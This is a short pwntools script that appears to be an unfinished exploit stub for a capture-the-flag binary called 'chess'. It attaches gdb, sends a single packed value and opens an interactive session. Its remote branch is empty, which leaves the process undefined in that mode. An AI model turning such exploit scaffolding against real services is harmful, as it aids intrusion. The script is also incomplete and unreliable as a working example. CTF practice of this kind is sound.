from pwn import * 

elf = ELF('./chess')
context.log_level = 'DEBUG'
libc = elf.libc

if args['REMOTE']: 
    pass
else: 
    p = process()
    gdb.attach(p, 'b main')
    pause()


payload = p32(0xFFFF)

p.recv()
p.sendline(payload)
p.interactive()